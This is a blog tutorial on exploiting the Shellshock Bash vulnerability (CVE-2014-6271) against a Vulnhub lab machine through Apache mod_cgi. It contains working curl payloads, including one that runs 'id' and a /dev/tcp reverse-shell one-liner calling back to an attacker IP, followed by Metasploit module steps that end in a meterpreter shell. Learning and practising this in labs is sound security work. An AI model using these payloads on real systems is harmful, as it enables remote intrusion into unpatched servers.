---
date: 2020-06-25 00:13:15
layout: post
title: "Exploiting a Shellshock Vulnerability"
subtitle:
description: In this article, I will be explaining how you can exploit a shellshock vulnerability manually as well as with metasaploit.
image: /assets/img/uploads/shellshock/shellshock-optimized.png
optimized_image:  /assets/img/uploads/shellshock/shellshock-optimized.png
category: exploitation
tags: CVE-2014-6271
author: madhavmehndiratta
paginate: false
keywords: shellshock, exploit shellshock manually, how to exploit shellshock vulnerability, shellshock vulnerability, exploit shellshock using metasploit, infosecarticles
---
<p align="justify"> One of the most critical bugs that came out in last decade was Shellshock, a vulnerability which allows attackers to execute arbitrary code via Unix Bash shell remotely. Shellshock is still a very real threat, especially for unpatched systems. It affected most versions of Linux and UNIX-based OSes. Nowadays, you will find this vulnerability in many CTF Challenges, so this article can help you to find a way by exploiting this vulnerability. </p>

## How this Vulnerability Works?

<p align="justify">
It is a security bug in the Unix Bash shell that causes Bash to execute bash commands from environment variables unintentionally. The vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list. </p>

<center><br>
<img src="/assets/img/uploads/shellshock/shellshock-methodology.png">
</center>

Upon running the above command, an affected version of bash will output <b>"vulnerable".</b>


## Manual Exploitation

<p align="justify"> Shellshock is actually an entire family of vulnerabilities consisting of multiple exploitation vectors. In this guide, we will be exploiting the mod_cgi module that is part of the Apache HTTP Server. For this article, I'll be using a bootroot machine <a href="https://www.vulnhub.com/entry/sumo-1,480/">"Sumo:1"</a> from Vulnhub. I've also posted a detailed writeup for this machine, you can find it <a href= "https://infosecarticles.com/sumo-1-vulnhub-walkthrough/"> here.</a></p>

On running a quick nikto scan, we can see that this machine is vulnerable to the Shellshock Vulnerability.

<center><br>
<img src="/assets/img/uploads/shellshock/nikto.png">
</center>

To check the vulnerability, We need to send a request using curl to the target machine and we can see that we retrieved the "id" of current user.

```r
root@kali:~# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.1.104/cgi-bin/test/test.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This exploit works! We were able to modify the environment variable and execute the "id" command. Using the same approach we can also open a reverse shell.

```r
root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.8/9001 0>&1' http://192.168.1.104/cgi-bin/test/test.cgi  
```

<center>
<img src="/assets/img/uploads/shellshock/shell.png">
</center>

<p align="justify"> The User-Agent value used in curl is stored as an environment variable on the remote machine. By default, this is set to <b>HTTP_USER_AGENT = curl/7.47.0</b> when using curl. However, this value can be modified. We can store malicious code that sets up a reverse shell inside this environment variable. </p>

## Exploitation using Metasploit

The same goal can also be achieved using Metasaploit. We can easily search for exploits by using the search command. We have many exploits available but the one we need is apache mod_cgi exploit.

<center><br>
<img src="/assets/img/uploads/shellshock/msf-search.png">
</center>

Load this module by using <b>use [module_name]</b> and then you can type <b>show options</b> to see the list of settings that we can change.

<center><br>
<img src="/assets/img/uploads/shellshock/msf-options.png">
</center>
<p align="justify">
For this attack, we need to set the <b>RHOSTS</b> to IP address of the target machine and <b>TARGETURI</b> to
the path where cgi_script is located. In this case it is /cgi-bin/test/test.cgi. Once these options are configured, we can run <b>check</b> to see if the target is vulnerable and then run the exploit. </p>

<center><br>
<img src="/assets/img/uploads/shellshock/msf-exploit.png">
</center>
<p align="justify"> A meterpreter session is opened, and now we can type <b>shell</b> which opens a shell on the target machine. Thatâ€™s it! I hope you understood the concept of shellshock vulnerability and how to exploit it. Thanks for reading. Stay tuned for similar tutorials and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a></p>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/zzzZet">Zet Aboard.</a>